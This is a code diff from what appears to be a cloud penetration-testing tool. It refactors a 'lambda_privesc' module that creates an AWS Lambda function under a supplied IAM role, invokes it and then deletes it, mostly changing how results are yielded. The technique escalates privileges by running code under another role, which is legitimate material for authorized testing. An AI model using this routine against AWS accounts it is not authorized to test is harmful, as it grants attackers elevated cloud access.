@@ -55,6 +55,7 @@ def lambda_handler(event, context):
     )
     return response
 """
+
         func_name = gen_random_string()
         with tempfile.TemporaryDirectory() as tmpdirname:
             zfile = os.path.join(tmpdirname, "lambda_privesc.py.zip")
@@ -65,38 +66,41 @@ def lambda_handler(event, context):
             os.chmod(zfile, int("755", 8))
             with open(zfile, "rb") as fp:
                 zfile_bytes = fp.read()
-                result.extend(
-                    self._handle_err(
-                        client.create_function,
-                        FunctionName=func_name,
-                        Role=self["RoleArn"],
-                        Handler="lambda_privesc.lambda_handler",
-                        Code={"ZipFile": zfile_bytes},
-                        Runtime="python3.9"
-                    )
+                func_info, result = self._handle_err(
+                    client.create_function,
+                    FunctionName=func_name,
+                    Role=self["RoleArn"],
+                    Handler="lambda_privesc.lambda_handler",
+                    Code={"ZipFile": zfile_bytes},
+                    Runtime="python3.9"
                 )
-                if result[-1][0] == res.RESULT:
-                    resp = result.pop()[1]
-                    status = resp["ResponseMetadata"]["HTTPStatusCode"]
-                    result.append((res.INFO, {"HTTPStatusCode": status}))
-                    result.extend(self._handle_err(client.invoke,
-                                  InvocationType="RequestResponse",
-                                  # LogType="Tail",
-                                  FunctionName=func_name))
-                    if result[-1][0] == res.RESULT:
-                        resp = result.pop()[1]
-                        status = resp["ResponseMetadata"]["HTTPStatusCode"]
-                        result.append((res.INFO, {"HTTPStatusCode": status}))
-                        result.extend(
-                            self._handle_err(
-                                client.delete_function,
-                                FunctionName=func_name
-                            )
+                yield func_info
+                if result[0] == res.RESULT:
+                    status = result[1]["ResponseMetadata"]["HTTPStatusCode"]
+                    yield res.INFO, {"HTTPStatusCode": status}
+                    func_info, result = self._handle_err(
+                        client.invoke,
+                        InvocationType="RequestResponse",
+                        # LogType="Tail",
+                        FunctionName=func_name
+                    )
+                    yield func_info
+                    if result[0] == res.RESULT:
+                        stat = result[1]["ResponseMetadata"]["HTTPStatusCode"]
+                        yield res.INFO, {"HTTPStatusCode": stat}
+                        func_info, result = self._handle_err(
+                            client.delete_function,
+                            FunctionName=func_name
                         )
-                        if result[-1][0] == res.RESULT:
-                            resp = result.pop()[1]
-                            status = \
-                                resp["ResponseMetadata"]["HTTPStatusCode"]
-                            result.append((res.INFO,
-                                           {"HTTPStatusCode": status}))
-        return result
+                        yield func_info
+                        if result[0] == res.RESULT:
+                            res_meta = result[1]["ResponseMetadata"]
+                            status = res_meta["HTTPStatusCode"]
+                            yield res.INFO, {"HTTPStatusCode": status}
+                        else:
+                            yield result
+                    else:
+                        yield result
+                else:
+                    yield result
+        yield res.END, "End"
